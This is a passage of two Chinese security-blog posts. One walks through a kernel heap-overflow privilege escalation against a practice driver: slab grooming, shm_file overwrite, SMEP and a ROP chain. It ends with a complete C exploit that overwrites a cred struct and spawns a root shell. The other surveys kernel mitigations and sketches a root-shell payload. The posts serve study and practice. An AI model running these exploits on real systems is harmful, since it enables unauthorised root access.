<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shmid_kernel</span> /* <span class="title">private</span> <span class="title">to</span> <span class="title">the</span> <span class="title">kernel</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span>    <span class="title">shm_perm</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *       <span class="title">shm_file</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>       shm_nattch;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>       shm_segsz;</span><br><span class="line">    <span class="keyword">time_t</span>          shm_atim;</span><br><span class="line">    <span class="keyword">time_t</span>          shm_dtim;</span><br><span class="line">    <span class="keyword">time_t</span>          shm_ctim;</span><br><span class="line">    <span class="keyword">pid_t</span>           shm_cprid;</span><br><span class="line">    <span class="keyword">pid_t</span>           shm_lprid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span>  *<span class="title">mlock_user</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The task created the shm object.  NULL if the task is dead. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>  *<span class="title">shm_creator</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>insmod加载编译好的驱动后，按道理应该自动创建好了memdev0-2字符设备，但是不知道为什么qemu里没有创建，需要自己手动创建，创建时需要知道设备的主设备号，于是在驱动源代码<code>cdev_add()</code>后面patch了一个打印主设备号的语句：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = cdev_add(&amp;cdev, devno, MEMDEV_NR_DEVS);</span><br><span class="line">printk(<span class="string">&quot;devno mem_major: %d\n&quot;</span>, MAJOR(devno)); <span class="comment">// patched</span></span><br></pre></td></tr></table></figure>
<p>这样加载驱动后，可以得到设备的主设备号，根据主设备号手动创建字符设备：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># mknod &#x2F;dev&#x2F;memdev0 c 250 0</span><br><span class="line"># mknod &#x2F;dev&#x2F;memdev1 c 250 1</span><br><span class="line"># mknod &#x2F;dev&#x2F;memdev2 c 250 2</span><br><span class="line"># chmod 777 &#x2F;dev&#x2F;memdev0</span><br><span class="line"># chmod 777 &#x2F;dev&#x2F;memdev1</span><br><span class="line"># chmod 777 &#x2F;dev&#x2F;memdev2</span><br></pre></td></tr></table></figure>

<h2 id="覆盖前的堆"><a href="#覆盖前的堆" class="headerlink" title="覆盖前的堆"></a>覆盖前的堆</h2><p>要保证覆盖到堆中的结构，需要分配的内存都是相邻的。内核里kmalloc是slab分配机制，一次至少分配一个页（4096字节），然后这个页分为多个连续的大小相同的块。内核中关于slab的信息，可以通过如下方式获得：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;slabinfo</span><br><span class="line">...</span><br><span class="line">kmalloc-8192          60     60   8192    4    8 : tunables    0    0    0 : slabdata     15     15      0</span><br><span class="line">kmalloc-4096         104    120   4096    8    8 : tunables    0    0    0 : slabdata     15     15      0</span><br><span class="line">kmalloc-2048         144    144   2048   16    8 : tunables    0    0    0 : slabdata      9      9      0</span><br><span class="line">kmalloc-1024         608    608   1024   32    8 : tunables    0    0    0 : slabdata     19     19      0</span><br><span class="line">kmalloc-512         1252   1376    512   32    4 : tunables    0    0    0 : slabdata     43     43      0</span><br><span class="line">kmalloc-256          924   1024    256   32    2 : tunables    0    0    0 : slabdata     32     32      0</span><br><span class="line">kmalloc-192         7835   8694    192   21    1 : tunables    0    0    0 : slabdata    414    414      0</span><br><span class="line">kmalloc-128         1087   1344    128   32    1 : tunables    0    0    0 : slabdata     42     42      0</span><br><span class="line">kmalloc-96         19430  19740     96   42    1 : tunables    0    0    0 : slabdata    470    470      0</span><br><span class="line">kmalloc-64         29187  29504     64   64    1 : tunables    0    0    0 : slabdata    461    461      0</span><br><span class="line">kmalloc-32         19337  23552     32  128    1 : tunables    0    0    0 : slabdata    184    184      0</span><br><span class="line">kmalloc-16          4096   4096     16  256    1 : tunables    0    0    0 : slabdata     16     16      0</span><br><span class="line">kmalloc-8          12288  12288      8  512    1 : tunables    0    0    0 : slabdata     24     24      0</span><br></pre></td></tr></table></figure>
<p>这是一些通用的slab，分配的时候是向上对齐的。比如，kmalloc分配的内存大小在区间(64, 96]，那么就会给它分配大小为96的块，在大小为96的slab中。slab中有空闲块的时候，会先分配空闲块，没有空闲块时，会分配新的slab。所以想要得到两个相邻的块，需要两个块大小处于同一区间（这里都是申请的大小为96的块），申请之前需要消耗掉所有空闲的大小为96的块。<br>回到题目中，想要通过<code>mem_write()</code>覆盖下一个堆块，即目标堆块<code>shmid_kernel</code>需要：</p>
<ul>
<li>不断调用mem_ioctl()，并设置arg.len=96，来消耗掉空闲的96字节的块。</li>
<li>紧接着调用shmget()来申请一个shmid_kernel结构。</li>
<li>再调用mem_write()来进行覆盖。</li>
</ul>
<p>排布好的堆如下：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">|  ...   |</span><br><span class="line">+--------+&lt;--fd[0]</span><br><span class="line">|   96   |</span><br><span class="line">+--------+&lt;--fd[1]</span><br><span class="line">|   96   |</span><br><span class="line">+--------+&lt;--fd[2]</span><br><span class="line">|   96   |</span><br><span class="line">+--------+&lt;--shmid_kernel</span><br><span class="line">|   96   |</span><br><span class="line">+--------+&lt;--fd[1]</span><br><span class="line">|   96   |</span><br><span class="line">+--------+</span><br></pre></td></tr></table></figure>

<h2 id="Overwrite"><a href="#Overwrite" class="headerlink" title="Overwrite"></a>Overwrite</h2><p>覆盖的过程就是要写fd[2]溢出到<code>shmid_kernel</code>中，将<code>shmid_kernel</code>的<code>shm_file</code>指针（fd[2]+0x60+0x38）指向我们自己伪造的file结构：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *ptr = &amp;file;</span><br><span class="line">file.f_op = &amp;op;</span><br><span class="line">op.mmap = attack_address;</span><br><span class="line">read(fd[<span class="number">2</span>], readbuf, <span class="number">0x60</span>+<span class="number">0x38</span>); <span class="comment">// 设置ppos偏移</span></span><br><span class="line">write(fd[<span class="number">2</span>], &amp;ptr, <span class="number">4</span>); <span class="comment">// 用伪造的file指针覆盖原file指针</span></span><br></pre></td></tr></table></figure>
<p>那么调用<code>shmat()</code>的时候，会调用：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shmid_kernel-&gt;shm_file-&gt;f_op-&gt;mmap()</span><br></pre></td></tr></table></figure>
<p>理论上也就会执行attack_address中的指令。但是我覆盖完之后，还没有执行到mmap就出错了，是因为伪造的file缺少内容<code>f_path</code>，导致在<code>do_shmat</code>的path相关的语句读取非法的地址导致内核错误。<br><img src="/images/problem5/do_shmat.png"><br>所以我想把原file的内容拷贝到我伪造的file中，但是用户空间的memcpy不能将内核空间内存拷贝到用户空间。<br>我又尝试查看正常情况下，<code>f_path</code>的内容：在<code>do_shmat()</code>的<code>path_get(&amp;path);</code>这一行下断点，查看&amp;path对应内存的值，伪造path结构体：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">path.mnt &#x3D; 0xd6c01280;</span><br><span class="line">path.dentry &#x3D; 0xd708ec00;</span><br><span class="line">file.f_path &#x3D; path;</span><br></pre></td></tr></table></figure>
<p>伪造后错误变成如下：<br><img src="/images/problem5/mntget.png"><br>参考的文章中file结构是在堆上与<code>shmid_kernel</code>结构相邻的所以只要伪造<code>f_op</code>即可，没有改变file的内容，而我的file结构在<code>shmid_kernel</code>更低的地址，驱动的read和write无法写到。但是文中说ioctl有任意地址写的问题，利用任意地址写只改写file结构的<code>f_op</code>指针应该可以达到目的，后面再研究一下。</p>
<h2 id="SMEP"><a href="#SMEP" class="headerlink" title="SMEP"></a>SMEP</h2><p>得到控制流之后以前的提权思路是将控制流转移到用户态的代码里来：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getroot</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是，这样只能针对没有开启SMEP(Supervisor Mode Execution Protection Enable)的情况。<br>什么是SMEP，简单来说就是禁止内核执行用户空间的代码。它存在于CR4寄存器的第20个bit。<br>在Android上也叫PXN。因为传统的内核提权漏洞利用，得到控制流之后，直接跳转到用户空间执行提权代码太容易，所以增加这个缓解机制。<br>由于系统开了SMEP，必须采用ROP的方法进行提权。</p>
<h2 id="ROP-amp-栈转移"><a href="#ROP-amp-栈转移" class="headerlink" title="ROP &amp; 栈转移"></a>ROP &amp; 栈转移</h2><p>构造ROP来调用  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br></pre></td></tr></table></figure>
<p>通过cat /proc/kallsyms得到符号表之后，可以定位<code>prepare_kernel_cred</code>和<code>commit_creds</code>的地址：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">commit_creds &#x3D; 0xc105dfe0</span><br><span class="line">prepare_kernel_cred &#x3D; 0xc105e280</span><br></pre></td></tr></table></figure>
<p>只需要传入参数0，看prepare_kernel_cred函数的汇编，这个参数用eax传递，所以需要的gadget：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop eax</span><br><span class="line">ret</span><br><span class="line">&#x2F;&#x2F; or</span><br><span class="line">xor eax, eax</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p><code>prepare_kernel_cred</code>的返回值会直接传给<code>commit_creds</code>，不用在ROP链里构造。初步ROP链：<br>| pop eax ; ret; | prepare_kernel_creds | commit_cred |<br>ROP链要写到栈里去，最后获得控制流之前，eax是内核堆上的地址，是<code>shmid_kernel</code>的<code>shm_file</code>，里面的内容我们可以控制。不好往栈里写数据，不妨把栈转移到能控制的地方。找一条<code>xchg eax, esp; ret 0x8b</code>这样的指令。因为eax是<code>shm_file</code>，还在内核空间，而其内容可以通过修改exploit中file的内容控制，相当于可以控制栈内容。</p>
<blockquote>
<p>内核ROP需要的gadget可以用ROPgadget工具在vmlinux文件中查找。</p>
</blockquote>
<h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><p>shmget()系统调用可以分配struct shmid_kernel，其中有我们想覆盖的函数指针。实现的关键代码如下：<br>ipc/shm.c  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(shmget, <span class="keyword">key_t</span>, key, <span class="keyword">size_t</span>, size, <span class="keyword">int</span>, shmflg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_ops</span> <span class="title">shm_ops</span>;</span></span><br><span class="line">    shm_ops.getnew = newseg;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> ipcget(ns, &amp;shm_ids(ns), &amp;shm_ops, &amp;shm_params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用链：shmget-&gt;ipcget-&gt;ipcget_new-&gt;getnew。由上面的代码可知getnew实际上是newseg。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">newseg</span><span class="params">(struct ipc_namespace *ns, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shmid_kernel</span> *<span class="title">shp</span>;</span></span><br><span class="line">    shp = ipc_rcu_alloc(<span class="keyword">sizeof</span>(*shp));</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">ipc_rcu_alloc</span><span class="params">(<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_rcu</span> *<span class="title">out</span> =</span> ipc_alloc(<span class="keyword">sizeof</span>(struct ipc_rcu) + size);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">ipc_alloc</span><span class="params">(<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *out;</span><br><span class="line">    <span class="keyword">if</span>(size &gt; PAGE_SIZE)</span><br><span class="line">        out = vmalloc(size);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        out = kmalloc(size, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用IDA反编译vmlinux，得到<code>ipc_alloc()</code>的地址，在调用<code>kmalloc()</code>前下断点（qemu启动内核，gdb远程附加），在用户空间中调用<code>shmget()</code>，可以看到分配的大小为96字节。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过做这个内核提权的练习，发现自己的代码能力还是太差，代码分析能力不足。后面还需要一些调试，还需要对Linux内核中的一些数据结构进行进一步了解，对源码进一步了解。  </p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>随着对Linux Kernel漏洞利用的继续学习，最近又重新看了一下这个没有解决好的问题，发现用刚学到的<a target="_blank" rel="noopener" href="http://pwn4.fun/2017/08/15/Linux-Kernel-UAF/">新方法</a>来做简直不要太简单（装逼一直是我的强项）。<br>用修改cred结构体的方法感觉是最简单的，这里有一个明显的堆溢出，只要通过ioctl申请cred结构体一样size的堆块，再紧接着fork，cred结构体就和前面申请的堆块相邻，只要溢出前面一个堆块来覆盖cred结构体中的数据即可。<br>下面是完成的exploit：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_init</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd[<span class="number">3</span>], i, now_uid, ret;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mem_init</span> <span class="title">arg</span>;</span></span><br><span class="line">    <span class="keyword">char</span> zero_buf[<span class="number">100</span>], readbuf[<span class="number">200</span>];</span><br><span class="line">    <span class="built_in">memset</span>(zero_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">100</span>);</span><br><span class="line">    pid = getpid();</span><br><span class="line">    now_uid = getuid();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pid = %d, uid = %d\n&quot;</span>, pid, now_uid);</span><br><span class="line">    </span><br><span class="line">    fd[<span class="number">0</span>] = open(<span class="string">&quot;/dev/memdev0&quot;</span>, O_RDWR);</span><br><span class="line">    fd[<span class="number">1</span>] = open(<span class="string">&quot;/dev/memdev1&quot;</span>, O_RDWR);</span><br><span class="line">    fd[<span class="number">2</span>] = open(<span class="string">&quot;/dev/memdev2&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fd[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] open driver failed!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] open driver success\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    arg.idx = <span class="number">0</span>;</span><br><span class="line">    arg.len = <span class="number">0x80</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">        ioctl(fd[<span class="number">0</span>], <span class="number">0</span>, &amp;arg);</span><br><span class="line">    &#125;</span><br><span class="line">    arg.idx = <span class="number">1</span>;</span><br><span class="line">    ioctl(fd[<span class="number">1</span>], <span class="number">0</span>, &amp;arg);</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123; <span class="comment">// child process</span></span><br><span class="line">        read(fd[<span class="number">1</span>], readbuf, <span class="number">0x80</span>); <span class="comment">// set llseek point</span></span><br><span class="line">        ret = write(fd[<span class="number">1</span>], zero_buf, <span class="number">28</span>);</span><br><span class="line">        now_uid = getuid();</span><br><span class="line">        <span class="keyword">if</span> (!now_uid) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;get root success\n&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;failed?&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还需要说明一下，这次我用的是Mac和VMware(Ubuntu 12.04 32bit linux-3.10)的组合，Mac上的gdb虽然不能识别ELF，没有符号表，但是还是可以和IDA静态分析相结合来下断点等。用VMware分析感觉比qemu更方便一些，不用每次修改exp时重启系统。<br><strong>reference</strong><br>初识linux内核漏洞利用<br><a target="_blank" rel="noopener" href="http://resources.infosecinstitute.com/exploiting-linux-kernel-heap-corruptions-slub-allocator/">Exploiting Linux Kernel Heap Corruptions (SLUB Allocator)</a><br>Exploit linux kernel slub overflow - wzt</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/06/12/Exploiting-Linux-Kernel-Heap-Corruptions/" data-id="ckhe7o4l7001uchl79rw606yz" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Linux-Kernel一些基础知识" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/06/12/Linux-Kernel%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="article-date">
  <time datetime="2017-06-12T12:05:48.000Z" itemprop="datePublished">2017-06-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/06/12/Linux-Kernel%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">Linux Kernel一些基础知识</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="最常见的内核漏洞"><a href="#最常见的内核漏洞" class="headerlink" title="最常见的内核漏洞"></a>最常见的内核漏洞</h3><ul>
<li>NULL pointer dereference</li>
<li>kernel space stack overflow</li>
<li>kernel slab overflow</li>
<li>race conditions</li>
</ul>
<p>一些漏洞利用比较简单，不需要准备Linux Kernel调试环境来写exploit，另外一些漏洞则需要Linux Kernel设计、工作原理和内存管理等方面的知识。</p>
<h3 id="Kernel-Expoit-Mitigations"><a href="#Kernel-Expoit-Mitigations" class="headerlink" title="Kernel Expoit Mitigations"></a>Kernel Expoit Mitigations</h3><p>1.内核中与用户空间相同的防御措施：</p>
<ul>
<li>DEP（存在）</li>
<li>Canary（存在）</li>
<li>ASLR（存在但是有限制）</li>
<li>PIE（不能直接使用）</li>
<li>RELRO（不能直接使用）</li>
</ul>
<p>2.内核中新的防御措施：</p>
<ul>
<li>MMAP_MIN_ADDR：mmap_min_addr是用来对抗null pointer dereference的，它不允许程序分配低内存.</li>
<li>KALLSYMS：/proc/kallsyms给出内核中所有symbol的地址，我们需要这个信息来写可靠的exploit，否则需要自己去泄露这个信息。kallsyms以前是全局可读的，现在它给没有权限的用户返回0.</li>
<li>RANDSTACK</li>
<li>STACKLEAK</li>
<li>SMEP/SMAP<br>SMEP：Supervisor Mode Execution Protection<br>SMAP：Supervisor Mode Access Protection</li>
</ul>
<h3 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h3><p>1.在内核态调用commit_creds(prepare_kernel_cred(0))，返回用户态执行起shell：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_r00t</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    trigger_fp_overwrite(&amp;get_r00t);</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// trigger fp use</span></span><br><span class="line">    trigger_vuln_fp();</span><br><span class="line">    <span class="comment">// Kernel Executes get_r00t()</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// Now we have root</span></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>SMEP防预这种类型的攻击的方法是：如果处理器处于<code>ring0</code>模式，并试图执行有<code>user</code>数据的内存时，就会触发一个页错误。<br>SMAP工作原理相同，但是通常是在访问数据时。<br>这阻止不了漏洞，但会给开发exploit增加大量工作。<br>2.patch thread_info-&gt;addr为0xFFFFFFFF，突破内核地址空间的界限，得到任意读写的权限，然后改写struct cred。</p>
<h3 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h3><p>x86 Linux内核参数传递顺序有两种方式：</p>
<ul>
<li><code>eax</code>, <code>edx</code>, <code>ecx</code>, 栈传递</li>
<li>直接栈传递</li>
</ul>
<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>经常需要在内核中查找系统调用的定义，比如<code>shmget</code>，在老版本内核中，系统调用通常定义为<code>sys_shmget</code>，可以直接通过相关符号查找。但新版本内核中，系统调用方式不同，采用了<code>SYSCALL_DEFINE3(shmget...)</code>的定义方式，其中3表示shmget有3个参数，参数的个数可以通过查看<code>include/linux/syscalls.h</code>文件中的定义得到。由于各系统调用的实现比较分散，查找时可以通过<code>grep -nr &quot;SYSCALL_DEFINE3(shmget&quot; .</code>在Linux内核源码中查找。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/06/12/Linux-Kernel%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" data-id="ckhe7o4lm002lchl7arcz9zii" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li></ul>

